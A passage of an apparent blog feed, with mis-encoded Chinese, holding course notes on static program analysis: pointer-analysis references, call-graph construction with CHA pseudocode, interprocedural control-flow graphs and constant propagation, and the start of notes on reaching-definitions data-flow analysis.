class="headerlink" title="ç›¸å…³æ–‡çŒ®"></a>ç›¸å…³æ–‡çŒ®</h1><ol><li>William E. Weihl, â€œInterprocedural Data Flow Analysis in the Presence of Pointers, Procedure Variables, and Label Variablesâ€. POPL 1980.</li><li>Vini Kanvar, Uday P. Khedker, â€œHeap Abstractions for Static Analysisâ€. ACM CSUR 2016.</li><li>Lars Ole Andersen, 1994. â€œProgram Analysis and Specialization for the C Programming Languageâ€. Ph.D. Thesis. University of Copenhagen.</li><li>Hardekopf B, Lin C. Flow-sensitive pointer analysis for millions of lines of code. CGO 2011:289-298.</li><li>Lecture Notes on Pointer Analysis, <a href="https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf" target="_blank" rel="noopener">https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> è¿‡ç¨‹é—´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>è¿‡ç¨‹å†…åˆ†æé‡åˆ°å‡½æ•°è°ƒç”¨åªèƒ½åšä¿å®ˆå‡è®¾ï¼Œå¯¼è‡´è¿‡å¤šè¯¯æŠ¥ï¼Œè€Œè¿‡ç¨‹é—´åˆ†æå¯ä»¥è·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œå› æ­¤æ›´å‡†ç¡®.</p><h1 id="Call-Graph-Construction"><a href="#Call-Graph-Construction" class="headerlink" title="Call Graph Construction"></a>Call Graph Construction</h1><blockquote><p> A call graph is a set of call edges from  call-sites to their target methods (callees)</p></blockquote><a id="more"></a><p>Call Graphï¼Œç¨‹åºä¸­è°ƒç”¨è¾¹çš„é›†åˆï¼Œè°ƒç”¨è¾¹ä»è°ƒç”¨ç‚¹ï¼ˆcall-siteï¼‰å‡ºå‘åˆ°è¢«è°ƒå‡½æ•°ï¼ˆcalleeï¼‰ï¼Œè¡¨ç¤ºç¨‹åºçš„è°ƒç”¨å…³ç³».</p><p>ç¡®å®šå‡½æ•°è°ƒç”¨ç›®æ ‡ï¼ˆæ„é€ è°ƒç”¨å›¾ï¼‰çš„åˆ†æç§°ä¸º<strong>æ§åˆ¶æµåˆ†æ</strong>ã€‚</p><h2 id="è°ƒç”¨å›¾æ„å»ºç®—æ³•"><a href="#è°ƒç”¨å›¾æ„å»ºç®—æ³•" class="headerlink" title="è°ƒç”¨å›¾æ„å»ºç®—æ³•"></a>è°ƒç”¨å›¾æ„å»ºç®—æ³•</h2><p>è°ƒç”¨å›¾æ„å»ºç®—æ³•ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><ol><li>Class hierarchy analysisï¼ˆCHAï¼‰</li><li>Rapid type analysisï¼ˆRTAï¼‰</li><li>Variable type analysisï¼ˆVTAï¼‰</li><li>Pointer analysisï¼ˆk-CFAï¼‰</li></ol><p>ç”±ä¸Šè‡³ä¸‹åˆ†æè¶Šæ¥è¶Šç²¾ç¡®ï¼Œä½†åˆ†ææˆæœ¬ä¹Ÿè¶Šæ¥è¶Šå¤§</p><h2 id="Javaè°ƒç”¨æŒ‡ä»¤"><a href="#Javaè°ƒç”¨æŒ‡ä»¤" class="headerlink" title="Javaè°ƒç”¨æŒ‡ä»¤"></a>Javaè°ƒç”¨æŒ‡ä»¤</h2><div class="table-container"><table><thead><tr><th></th><th>é™æ€è°ƒç”¨</th><th>ç‰¹æ®Šè°ƒç”¨</th><th>è™šè°ƒç”¨</th></tr></thead><tbody><tr><td>æŒ‡ä»¤</td><td>invokestatic</td><td>invokespecial</td><td>invokeinterface, invokevirtual</td></tr><tr><td>æ˜¯å¦æ¥å—å¯¹è±¡å®ä¾‹</td><td>N</td><td>Y</td><td>Y</td></tr><tr><td>è¢«è°ƒæ–¹æ³•</td><td>é™æ€æ–¹æ³•</td><td>æ„é€ å‡½æ•°ã€ç§æœ‰å®ä¾‹å‡½æ•°ã€çˆ¶ç±»å®ä¾‹å‡½æ•°</td><td>å…¶ä»–å®ä¾‹æ–¹æ³•</td></tr><tr><td>ç›®æ ‡æ–¹æ³•ä¸ªæ•°</td><td>1</td><td>1</td><td>â‰¥1ï¼ˆå¤šæ€ï¼‰</td></tr><tr><td>ç»‘å®šæ—¶é—´</td><td>ç¼–è¯‘æ—¶</td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr></tbody></table></div><p>å¯ä»¥çœ‹åˆ°ï¼Œå¤„ç†è™šè°ƒç”¨æ˜¯æ„é€ è°ƒç”¨å›¾çš„å…³é”®ã€‚</p><h2 id="Method-Dispatch"><a href="#Method-Dispatch" class="headerlink" title="Method Dispatch"></a>Method Dispatch</h2><p>åœ¨è¿è¡Œæ—¶ï¼Œvirtualcallè°ƒç”¨ï¼ˆ$o^1.foo(\dots)^2$ï¼‰çš„å‡½æ•°ä¸»è¦åŸºäºä¸¤ç‚¹ï¼š</p><ol><li>è°ƒç”¨è€…å®ä¾‹å¯¹è±¡ç±»å‹($o^1$ æŒ‡é’ˆ)ï¼Œè®°ä¸º $c$</li><li>è°ƒç”¨ç‚¹çš„å‡½æ•°ç­¾åï¼Œè®°ä¸º$m$</li></ol><p><strong>å‡½æ•°ç­¾åï¼š</strong>åŒ…æ‹¬ç±»åã€æ–¹æ³•åã€ä»¥åŠæ–¹æ³•æè¿°ç¬¦ï¼ˆdescriptorï¼‰ï¼Œä¸‹å›¾ä¸ºç¤ºä¾‹ï¼Œå‡½æ•°ç­¾åè¡¨ç¤ºä¸º<code>C.foo(P, Q, R)</code><br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817210616520.png" alt="image-20200817210616520"></p><p>å¯ä»¥çœ‹åˆ°æ–¹æ³•æè¿°ç¬¦åŒ…æ‹¬äº†å‡½æ•°çš„è¿”å›å€¼ç±»å‹å’Œå‚æ•°ç±»å‹ã€‚</p><p>å®šä¹‰å‡½æ•° $\mathrm{Dispatch}(c,m)$ï¼Œè¯¥å‡½æ•°æ¨¡æ‹Ÿè¿è¡Œæ—¶ç©¶ç«Ÿè°ƒç”¨å“ªä¸ªå‡½æ•°</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><p>å³å½“virtualinvokeæ—¶ï¼Œå¦‚æœå½“å‰ç±» $c$ ä¸­å­˜åœ¨ä¸€ä¸ªéæŠ½è±¡å‡½æ•° $mâ€™$ ï¼Œè¯¥å‡½æ•°åç§°å’Œæ‘˜è¦ä¸$m$ç›¸åŒï¼Œé‚£ä¹ˆè°ƒç”¨è¯¥å‡½æ•°ï¼›</p><p>å¦åˆ™é€’å½’ï¼Œå¯¹ $c$ çš„<strong>çˆ¶ç±»</strong>è°ƒç”¨ $Dispatch$ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥æ–¹æ³•ã€‚</p><h1 id="CHAï¼ˆClass-Hierarchy-Analysisï¼‰"><a href="#CHAï¼ˆClass-Hierarchy-Analysisï¼‰" class="headerlink" title="CHAï¼ˆClass Hierarchy Analysisï¼‰"></a>CHAï¼ˆClass Hierarchy Analysisï¼‰</h1><p>å½“è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œè§£æè°ƒç”¨ç±»å®šä¹‰ï¼Œæ ¹æ®å®šä¹‰ç±»æšä¸¾å…¶<strong>æ‰€æœ‰å­ç±»</strong>ï¼Œæ‰€æœ‰å­ç±»ç¬¦åˆè¦æ±‚çš„å‡½æ•°éƒ½æ˜¯å¯èƒ½ä¼šè¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>é€šè¿‡æ£€æŸ¥Açš„æ‰€æœ‰å­ç±»ï¼Œå¯»æ‰¾è¢«è°ƒç”¨å‡½æ•°</p><p>å…·ä½“ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Resolve</span><span class="params">(cs)</span>:</span> <span class="comment"># csä¸ºcall site</span></span><br><span class="line">T = &#123;&#125; <span class="comment"># ç®—æ³•æœ€ç»ˆè¾“å‡ºcsæ‰€æœ‰å¯èƒ½è°ƒç”¨çš„å‡½æ•°é›†åˆ</span></span><br><span class="line">    m = method signature at cs</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ staticcallï¼Œç›´æ¥å°†è¯¥å‡½æ•°åŠ å…¥é›†åˆ</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a static call:</span><br><span class="line">    T = &#123; m &#125; </span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ specialcallï¼Œè¦å¤„ç†ä¸‰ç§æ–¹æ³•ï¼Œå–æ–¹æ³•mçš„ç±»cmï¼Œå¹¶è°ƒç”¨Dispatch()å¾—åˆ°æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> special call:</span><br><span class="line">        cm = <span class="class"><span class="keyword">class</span> <span class="title">type</span> <span class="title">of</span> <span class="title">m</span></span></span><br><span class="line">        T = &#123; Dispatch(cm, m) &#125;</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯virtualcallï¼Œé¦–å…ˆè·å–åŒ…æ‹¬csè‡ªèº«ç±»åœ¨å†…çš„æ‰€æœ‰å­ç±»ï¼Œåœ¨å°†å…¶dispatch()ç»“æœåŠ å…¥é›†åˆTä¸­</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a virtual call:</span><br><span class="line">        c = declared type of receiver variable at cs </span><br><span class="line">        <span class="keyword">for</span> each sub_c that <span class="keyword">is</span> a subclass of c <span class="keyword">or</span> C itself:</span><br><span class="line">            add Dispatch(sub_c, m) to T</span><br><span class="line">    <span class="keyword">return</span> T</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºå®é™…ç¤ºä¾‹ï¼Œæ³¨æ„ï¼ŒCHAåªè€ƒè™‘å£°æ˜ç±»å‹ï¼Œä¸è§£æå®ä¾‹ï¼Œå› æ­¤åœ¨åé¢Bå³ä½¿å®ä¾‹åŒ–ä¸ºnew B()ï¼Œä½†æ˜¯è§£æä»ç„¶æœ‰3ç§ï¼Œè¿™ä¹Ÿçœ‹å‡ºäº†CHAçš„ç¼ºé™·ã€‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817213356449.png" alt="image-20200817213356449"></p><h2 id="CHAç‰¹å¾"><a href="#CHAç‰¹å¾" class="headerlink" title="CHAç‰¹å¾"></a>CHAç‰¹å¾</h2><ul><li>å¿«<ul><li>åªè€ƒè™‘å£°æ˜</li><li>å¿½ç•¥æ•°æ®æµå’Œæ§åˆ¶æµ</li></ul></li><li>ä¸å‡†<ul><li>å¯¼è‡´å‡ç›®æ ‡æ–¹æ³•</li></ul></li><li>IDEå¸¸ç”¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚è¯´ IDEAï¼‰</li></ul><h2 id="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"><a href="#ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG" class="headerlink" title="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"></a>ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG</h2><ol><li><p>ä»ä¸€äº›å…¥å£å‡½æ•°å¼€å§‹ï¼ˆå¦‚<code>main()</code>ï¼‰</p></li><li><p>å¯¹äºæ¯ä¸€ä¸ªåˆ°è¾¾çš„æ–¹æ³• $m$ï¼Œç”¨CHAè§£æå…¶ä¸­æ¯ä¸ªcall sitesï¼Œå³ï¼ˆ$Resolve(cs)$ï¼‰</p></li><li><p>é‡å¤ç›´åˆ°æ²¡æœ‰æ–°çš„å‡½æ•°éœ€è¦è¢«å‘ç°</p></li></ol><p>å¯ä»¥ç”¨DFSæˆ–è€…BFSå®ç°ï¼Œ ä»¥ä¸‹ä¸ºBFSæœç´¢ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BuildCallGraph(m_entry):</span><br><span class="line">WL = [m_entry] <span class="comment"># å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line">CG = &#123;&#125; <span class="comment"># å­˜æ”¾callgraphï¼Œè¾¹çš„é›†åˆ</span></span><br><span class="line">RM = &#123;&#125; <span class="comment"># å¯è¾¾çš„æ–¹æ³•ï¼ˆbookï¼‰</span></span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">remove m <span class="keyword">from</span> WL</span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM then add m to RM</span><br><span class="line">        <span class="comment"># é€šè¿‡ CHA è§£æm()ä¸­çš„æ‰€æœ‰è°ƒç”¨ cs</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> m:</span><br><span class="line">     T = Resolve(cs)</span><br><span class="line"><span class="keyword">for</span> target_method <span class="keyword">in</span> T:</span><br><span class="line">add (cs â†’ target_method) to CG <span class="comment"># å°†è°ƒç”¨åŠ å…¥åˆ°Callgraphä¸­</span></span><br><span class="line">add target_method to WL</span><br><span class="line"><span class="keyword">return</span> CG</span><br></pre></td></tr></table></figure><h1 id="Interprocedural-Control-Flow-Graph"><a href="#Interprocedural-Control-Flow-Graph" class="headerlink" title="Interprocedural Control-Flow Graph"></a>Interprocedural Control-Flow Graph</h1><p>ICFGï¼ˆInterprocedural Control-Flow Graphï¼‰ï¼Œåœ¨CFGåŸºç¡€ä¸ŠåŠ ä¸ŠCall edgeså’ŒReturn edges</p><ul><li>Call edgesï¼šä»è°ƒç”¨ç‚¹ï¼ˆcall sitesï¼‰å‡ºå‘è‡³è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleesï¼‰</li><li>Return edgesï¼šä»è¢«è°ƒå‡½æ•°returnè¯­å¥å‡ºå‘è‡³è°ƒç”¨ç‚¹çš„ä¸‹ä¸€æ¡è¯­å¥ï¼ˆreturn sitesï¼‰</li></ul><p>e.g.,<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818202917677.png" alt="image-20200818202917677"></p><p>æ³¨æ„åœ¨æ·»åŠ ä¸¤æ¡è¾¹åï¼ŒåŸå…ˆçš„è¾¹å¹¶ä¸åˆ å»ã€‚</p><h1 id="Interprocedural-Data-Flow-Analysis"><a href="#Interprocedural-Data-Flow-Analysis" class="headerlink" title="Interprocedural Data-Flow Analysis"></a>Interprocedural Data-Flow Analysis</h1><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå³åœ¨ ICFG ä¸Šåšåˆ†æ</p><p>åœ¨ Transfer functions ä¸­é™¤äº† CFG ä¸­çš„ Node transfer è¿˜åŠ äº† edge transferï¼š</p><ul><li>Call edge transferï¼šåœ¨ call node è‡³ callee çš„ç¬¬ä¸€ä¸ªnode ä¸Šä¼ é€’æ•°æ®æµï¼ˆä¼ å‚æ•°ï¼‰</li><li>Return edge transferï¼šåœ¨ return node è‡³ return site ä¸Šä¼ é€’æ§åˆ¶æµï¼ˆä¼ è¿”å›å€¼ï¼‰</li></ul><h2 id="Interprocedural-Constant-Propagation"><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h2><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå¹¶æ²¡æœ‰åƒè¿‡ç¨‹å†…åˆ†æé‚£æ ·æœ‰è§„èŒƒçš„ç®—æ³•ï¼Œè¿™é‡Œä»¥å¸¸é‡ä¼ æ’­ä¸ºä¾‹ï¼Œè§£é‡Šè¿‡ç¨‹é—´åˆ†æè¿‡ç¨‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818204421280.png" alt="image-20200818204421280"></p><p>å¯¹äºéå‡½æ•°è°ƒç”¨è¯­å¥ï¼Œä»ç„¶ç”¨node transferå¤„ç†ï¼Œé‡åˆ°å‡½æ•°è°ƒç”¨ï¼ˆcall expressionï¼‰æ—¶ï¼š</p><ol><li>killæ‰å·¦è¾¹çš„å˜é‡çš„å€¼</li><li>ç”± <strong>Call edge transfer</strong> å°†å®å‚ä¼ é€’è‡³callee enter å¤„ï¼Œåœ¨calleeä¸Šä¸‹æ–‡åšè¿‡ç¨‹é—´åˆ†æ</li><li>åˆ†æè‡³callee returnæ—¶ï¼Œç”±<strong>Return edge transfer</strong>å°†è‡³ä¼ å›callerä¸Šä¸‹æ–‡</li></ol><p><strong>å…³äºæ˜¯å¦ä¿ç•™call-to-return edgeï¼š</strong></p><p>ä¿ç•™call-to-return edgeï¼Œå¯ä»¥ä¿ç•™callerä¸Šä¸‹æ–‡æ•°æ®å˜é‡ï¼Œè‹¥æ²¡æœ‰è¿™æ¡è¾¹åˆ™éœ€è¦æŠŠå½“å‰å‡½æ•°ä¸Šä¸‹æ–‡å˜é‡ä¼ è¿›è¢«è°ƒå‡½æ•°ï¼ˆå¦‚åˆ†æ <code>ten()</code> æ—¶ï¼Œéœ€è¦ä¼ é€’<code>a, b, c</code>ï¼‰ï¼Œè¿™æ˜¯ä½æ•ˆçš„ã€‚</p><p><strong>æ³¨æ„</strong>åœ¨call expressionæ—¶ï¼Œå…ˆæŠŠleftçš„å€¼killæ‰ï¼ˆå¦‚è°ƒç”¨<code>ten()</code>æ˜¯ï¼Œå…ˆæŠŠbçš„å€¼killï¼Œå¦åˆ™ä¼šäº§ç”Ÿå†²çªï¼‰</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚ä¸»è¦è®²äº†è¿‡ç¨‹é—´åˆ†æä¸»è¦æ–¹æ³•ï¼Œå³å…ˆç”ŸæˆCallgraphï¼Œå†åˆæˆICFGè¿›è¡Œæ•°æ®æµåˆ†æï¼Œå¹¶ä¸”ä»‹ç»äº†ä¸€ä¸ªç®€å•çš„ç”ŸæˆCallGraphçš„æ–¹æ³•â€”â€”CHAï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°CHAæœ‰è¾ƒå¤§ç¼ºé™·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> è¿‡ç¨‹é—´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E5%BA%94%E7%94%A8%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E5%BA%94%E7%94%A8%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Overview-amp-Preliminaries"><a href="#Overview-amp-Preliminaries" class="headerlink" title="Overview &amp;  Preliminaries"></a>Overview &amp;  Preliminaries</h1><p>ä¸¤ç±»åˆ†æï¼š</p><ul><li>may Analysisï¼šover-approximation</li><li>must Analysisï¼šunder-approximation</li></ul><p>å®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†safety of analysisã€‚</p><h2 id="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"><a href="#å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š" class="headerlink" title="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"></a>å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š</h2><a id="more"></a><p>è§£é‡Šä¸€ï¼š</p><blockquote><p>An analysis to figure out â€œhow <strong>application-specific Data</strong> Flows through the <strong>Nodes(BBs/statements)</strong> and <strong>Edges(control flows) </strong>of CFG(a program)?â€</p></blockquote><p>å¯¹äºapplication-specific dataï¼Œç”±å¯¹å˜é‡æˆ–è¡¨è¾¾å¼<strong>æŠ½è±¡ï¼ˆAbstractionï¼‰</strong>è¡¨ç¤ºï¼›å¯¹äºNodesï¼Œç”±<strong>Transfer function</strong>å¤„ç†ï¼›å¯¹äºEdgesï¼Œæœ‰<strong>Control-flow handing</strong>å¤„ç†ã€‚</p><p>Abstractionã€Transfer functionå’ŒControl-flow handingæ˜¯è®¾è®¡ä¸€ä¸ªæ•°æ®æµåˆ†æçš„ä¸‰ä¸ªå…³é”®è¦ç´ ã€‚</p><p>è§£é‡ŠäºŒï¼š</p><blockquote><p>In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³ç»™å‡ºæ¯ä¸€ä¸ªç¨‹åºç‚¹ä¸€ä¸ªæ§åˆ¶æµçš„å€¼ï¼Œè¯¥å€¼æ˜¯è¡¨ç¤ºåœ¨è¯¥ç‚¹èƒ½åˆ†æåˆ°çš„æ‰€æœ‰å¯èƒ½ç»“æœçš„æŠ½è±¡è¡¨ç¤ºã€‚</p><p>è§£é‡Šä¸‰ï¼š</p><blockquote><p>Data-flow analysis is to find a solution to a set of safe-approximation-directed constraints on the IN[s]â€™s and OUT[s]â€™s, for all statements $s$.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³åœ¨safe-approximationè§„åˆ™ï¼ˆmay or mastï¼‰çº¦æŸä¸‹ï¼Œè§£å‡ºæ¯ä¸€ä¸ªstatementsçš„INå’ŒOUTã€‚</p><p>è¿™é‡Œçš„INå’ŒOUTæŒ‡æ¯ä¸€ä¸ªè¯­å¥çš„è¾“å…¥å’Œè¾“å‡ºã€‚</p><p>è¿™é‡Œçš„çº¦æŸåŒ…å«äº†è¯­ä¹‰ï¼ˆè½¬æ¢å‡½æ•°ï¼‰å’Œæ§åˆ¶æµä¿¡æ¯ï¼ˆControl-flow Handingï¼‰ã€‚</p><h2 id="è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰"><a href="#è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰" class="headerlink" title="è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰"></a>è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰</h2><p>åˆ†æå•ä¸ªBBçš„å‡½æ•°ï¼Œå­˜åœ¨å‰å‘åˆ†æå’Œåå‘åˆ†æï¼š</p><ul><li><p>å‰å‘åˆ†æï¼ˆForward Analysisï¼‰<br>$Out[s]=f_s(IN[s])$</p></li><li><p>åå‘åˆ†æï¼ˆBackward Analysisï¼‰ï¼Œå°†CFGåå‘ç­‰äºForward<br>$In[s]=f_s(OUT[s])$</p></li></ul><h2 id="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰"><a href="#æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰" class="headerlink" title="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰"></a>æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰</h2><p>å®šä¹‰æ•°æ®æµåœ¨BBsé—´çš„æµåŠ¨æ–¹å¼ï¼Œæ§åˆ¶æµä¸­çš„BBså­˜åœ¨ä¸‰ç§æƒ…å†µï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175052488.png" alt="image-20200802175052488"></p><p>åä¸¤ç§æƒ…å†µå­˜åœ¨äº¤æ±‡(meet)æ“ä½œï¼ˆç¬¬äºŒç§åå‘åˆ†æå­˜åœ¨ï¼‰</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175345773.png" alt="image-20200802175345773"></p><p>å¯¹äºç¬¬ä¸‰ç§æƒ…å†µä¸‹çš„å‰å‘åˆ†æï¼ŒBçš„INæ˜¯æ‰€æœ‰å…¥å‘çš„ä»£ç å—OUTçš„meetï¼›å¯¹äºç¬¬äºŒç§æƒ…å†µä¸‹çš„åå‘åˆ†æï¼ŒBçš„OUTæ˜¯æ‰€æœ‰å‡ºå‘ä»£ç å—INçš„meetã€‚</p><h1 id="Reaching-Definitions-Analysis"><a href="#Reaching-Definitions-Analysis" class="headerlink" title="Reaching Definitions Analysis"></a>Reaching Definitions Analysis</h1><blockquote><p>A definition $d$ at program point $p$ reaches a point $q$ if there is a path from $p$ to $q$ such that $d$ is not â€œkilledâ€ along that path.</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ å¤„å˜é‡vçš„<strong>å®šä¹‰d</strong>ï¼Œæ£€æµ‹å…¶åœ¨$ p\sim q$çš„è·¯å¾„ä¸Šæ˜¯å¦æœ‰æ–°çš„å®šä¹‰ï¼ˆå¯ä»¥ç”¨äºç©ºæŒ‡é’ˆé—®é¢˜ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡"><a href="#ç®—æ³•è®¾è®¡" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> ç”¨bit vecotrè¡¨ç¤ºé›†åˆï¼Œé›†åˆä¸­å…ƒç´ è¡¨ç¤ºæ¯ä¸€åˆ°è¾¾è¯¥ç‚¹çš„è¯­å¥<br> e.g. D1, D2, â€¦ , Dn=01â€¦0 (è¡¨ç¤ºD2å®šä¹‰åœ¨å½“ä¸”ä½ç½®æœ‰æ–°å®šä¹‰)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong><br> å¯¹äºä¸€ä¸ªå®šä¹‰è¯­å¥<code>D: v = x op y</code>ï¼Œkillï¼ˆåœ¨é›†åˆï¼‰ä¸vç›¸å…³çš„å…¶ä»–è¯­å¥ï¼Œå¹¶åœ¨é›†åˆä¸­åŠ å…¥Dï¼Œå³ï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><p> <strong>Control-flow Handingï¼š</strong><br> å½“å¤šä¸ªä»£ç å—æ±‡èšæ—¶ï¼Œåˆå¹¶æ‰€æœ‰çš„å®šä¹‰ï¼ˆmayï¼‰</p><script type="math/tex; mode=display">\mathrm{IN}[B]=\bigcup_{P \text { a predecessor of } B} OUT [P]</script></li><li><p>åº”ç”¨ç»å…¸çš„æ•°æ®æµåˆ†æç®—æ³•æ¡†æ¶ï¼ˆIterative algorithmï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/8890_1.png" alt="Iterative algorithm"></p><h2 id="éå†ç»“æœ"><a href="#éå†ç»“æœ" class="headerlink" 